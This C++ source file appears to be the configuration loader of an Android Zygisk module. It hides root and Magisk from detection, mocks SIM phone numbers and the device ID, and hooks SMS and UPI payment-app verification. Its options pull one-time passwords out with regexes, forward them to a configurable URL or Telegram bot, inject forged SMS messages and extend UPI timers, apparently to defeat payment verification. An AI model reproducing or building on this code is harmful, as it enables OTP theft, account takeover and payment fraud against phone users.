#include "config.hpp"

#include <fstream>
#include <sstream>
#include <algorithm>
#include <cctype>

namespace {

std::string trim(const std::string& input) {
    auto start = input.find_first_not_of(" \t\r\n");
    if (start == std::string::npos) return "";
    auto end = input.find_last_not_of(" \t\r\n");
    return input.substr(start, end - start + 1);
}

bool parse_bool(const std::string& json, const std::string& key, bool default_value) {
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return default_value;
    pos = json.find(':', pos);
    if (pos == std::string::npos) return default_value;
    auto value_start = json.find_first_not_of(" \t\r\n", pos + 1);
    if (value_start == std::string::npos) return default_value;
    if (json.compare(value_start, 4, "true") == 0) return true;
    if (json.compare(value_start, 5, "false") == 0) return false;
    return default_value;
}

std::string parse_string(const std::string& json, const std::string& key, const std::string& default_value) {
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return default_value;
    pos = json.find(':', pos);
    if (pos == std::string::npos) return default_value;
    pos = json.find('"', pos + 1);
    if (pos == std::string::npos) return default_value;
    auto end = json.find('"', pos + 1);
    if (end == std::string::npos) return default_value;
    return json.substr(pos + 1, end - pos - 1);
}

std::vector<std::string> parse_string_array(const std::string& json, const std::string& key) {
    std::vector<std::string> result;
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return result;
    pos = json.find('[', pos);
    if (pos == std::string::npos) return result;
    auto end = json.find(']', pos);
    if (end == std::string::npos) return result;

    std::string array_content = json.substr(pos + 1, end - pos - 1);
    size_t cursor = 0;
    while (cursor < array_content.size()) {
        auto quote_start = array_content.find('"', cursor);
        if (quote_start == std::string::npos) break;
        auto quote_end = array_content.find('"', quote_start + 1);
        if (quote_end == std::string::npos) break;
        result.push_back(array_content.substr(quote_start + 1, quote_end - quote_start - 1));
        cursor = quote_end + 1;
    }
    return result;
}

std::map<std::string, std::string> parse_headers(const std::string& json) {
    std::map<std::string, std::string> headers;
    const std::string key = "\"forward_headers\"";
    auto pos = json.find(key);
    if (pos == std::string::npos) return headers;
    pos = json.find('{', pos);
    if (pos == std::string::npos) return headers;
    auto end = json.find('}', pos);
    if (end == std::string::npos) return headers;

    std::string block = json.substr(pos + 1, end - pos - 1);
    size_t cursor = 0;
    while (cursor < block.size()) {
        auto key_start = block.find('"', cursor);
        if (key_start == std::string::npos) break;
        auto key_end = block.find('"', key_start + 1);
        if (key_end == std::string::npos) break;
        auto colon = block.find(':', key_end);
        if (colon == std::string::npos) break;
        auto val_start = block.find('"', colon);
        if (val_start == std::string::npos) break;
        auto val_end = block.find('"', val_start + 1);
        if (val_end == std::string::npos) break;

        headers[block.substr(key_start + 1, key_end - key_start - 1)] =
            block.substr(val_start + 1, val_end - val_start - 1);
        cursor = val_end + 1;
    }
    return headers;
}

std::map<std::string, bool> parse_bool_map(const std::string& json, const std::string& key) {
    std::map<std::string, bool> result;
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return result;
    pos = json.find('{', pos);
    if (pos == std::string::npos) return result;
    auto end = json.find('}', pos);
    if (end == std::string::npos) return result;

    std::string block = json.substr(pos + 1, end - pos - 1);
    size_t cursor = 0;
    while (cursor < block.size()) {
        auto key_start = block.find('"', cursor);
        if (key_start == std::string::npos) break;
        auto key_end = block.find('"', key_start + 1);
        if (key_end == std::string::npos) break;
        auto colon = block.find(':', key_end);
        if (colon == std::string::npos) break;
        auto value_start = block.find_first_not_of(" \t\r\n", colon + 1);
        if (value_start == std::string::npos) break;

        result[block.substr(key_start + 1, key_end - key_start - 1)] =
            block.compare(value_start, 4, "true") == 0;
        cursor = key_end + 1;
    }
    return result;
}

std::string read_file(const std::string& path) {
    std::ifstream file(path);
    if (!file.is_open()) return "";
    std::ostringstream ss;
    ss << file.rdbuf();
    return ss.str();
}

int parse_int(const std::string& json, const std::string& key, int default_value) {
    const std::string needle = "\"" + key + "\"";
    auto pos = json.find(needle);
    if (pos == std::string::npos) return default_value;
    pos = json.find(':', pos);
    if (pos == std::string::npos) return default_value;
    auto start = json.find_first_not_of(" \t\r\n", pos + 1);
    if (start == std::string::npos) return default_value;
    size_t end = start;
    while (end < json.size() && (std::isdigit(static_cast<unsigned char>(json[end])) || json[end] == '-')) {
        ++end;
    }
    try {
        return std::stoi(json.substr(start, end - start));
    } catch (...) {
        return default_value;
    }
}

}  // namespace

ConfigManager& ConfigManager::instance() {
    static ConfigManager manager;
    return manager;
}

bool ConfigManager::load() {
    const std::vector<std::string> paths = {
        "/sdcard/Android/data/com.hivirtus.zygiskmode/files/hivirtus_zygisk_mode_config.json",
        "/data/local/tmp/hivirtus_zygisk_mode_config.json",
        "/data/adb/modules/hivirtus_zygisk_mode/config.json",
    };

    std::string json;
    for (const auto& path : paths) {
        json = read_file(path);
        if (!json.empty()) break;
    }

    if (json.empty()) {
        loaded_ = false;
        return false;
    }

    config_.hide_root = parse_bool(json, "hide_root", true);
    config_.hide_developer = parse_bool(json, "hide_developer", true);
    config_.hide_magisk = parse_bool(json, "hide_magisk", true);
    config_.hide_kernelsu = parse_bool(json, "hide_kernelsu", true);
    config_.hide_apatch = parse_bool(json, "hide_apatch", true);
    config_.hide_sukisu = parse_bool(json, "hide_sukisu", true);
    config_.hide_all_root_apps = parse_bool(json, "hide_all_root_apps", true);
    config_.enable_sim1_mock = parse_bool(json, "enable_sim1_mock", false);
    config_.enable_sim2_mock = parse_bool(json, "enable_sim2_mock", false);
    config_.enable_phone_spoof = parse_bool(json, "enable_phone_spoof", false);
    config_.mock_country_iso = parse_string(json, "mock_country_iso", config_.mock_country_iso);
    config_.mock_phone_sim1 = parse_string(json, "mock_phone_sim1", config_.mock_phone_sim1);
    config_.mock_phone_sim2 = parse_string(json, "mock_phone_sim2", config_.mock_phone_sim2);
    config_.hook_incoming_sms = parse_bool(json, "hook_incoming_sms", true);
    config_.hook_outgoing_sms = parse_bool(json, "hook_outgoing_sms", true);
    config_.hook_upi_verification = parse_bool(json, "hook_upi_verification", true);
    config_.auto_extract_otp = parse_bool(json, "auto_extract_otp", true);
    config_.auto_forward_token = parse_bool(json, "auto_forward_token", true);
    config_.forward_url = parse_string(json, "forward_url", config_.forward_url);
    config_.forward_method = parse_string(json, "forward_method", config_.forward_method);
    config_.telegram_chat_id = parse_string(json, "telegram_chat_id", config_.telegram_chat_id);
    config_.telegram_bot_token = parse_string(json, "telegram_bot_token", config_.telegram_bot_token);
    config_.inject_sender_id = parse_string(json, "inject_sender_id", config_.inject_sender_id);
    config_.inject_message_body = parse_string(json, "inject_message_body", config_.inject_message_body);
    config_.log_file = parse_string(json, "log_file", config_.log_file);
    config_.otp_patterns = parse_string_array(json, "otp_patterns");
    config_.forward_headers = parse_headers(json);
    config_.hooked_upi_apps = parse_bool_map(json, "hooked_upi_apps");
    config_.enable_device_id_spoof = parse_bool(json, "enable_device_id_spoof", false);
    config_.spoof_android_id = parse_string(json, "spoof_android_id", config_.spoof_android_id);
    config_.upi_timer_bonus_seconds = parse_int(json, "upi_timer_bonus_seconds", 20);

    if (config_.otp_patterns.empty()) {
        config_.otp_patterns = {
            R"(\b(\d{4,8})\b.*(?:otp|code|verification|verify|pin))",
            R"((?:otp|code|verification|verify|pin)[:\s]*(\d{4,8}))",
            R"(Your verification OTP code is (\d{4,8}))",
        };
    }

    loaded_ = true;
    return true;
}

void ConfigManager::reload() {
    load();
}

bool ModuleConfig::is_upi_app_hooked(const std::string& package) const {
    if (package.empty()) return false;
    if (hooked_upi_apps.empty()) return true;
    const auto it = hooked_upi_apps.find(package);
    if (it == hooked_upi_apps.end()) return false;
    return it->second;
}
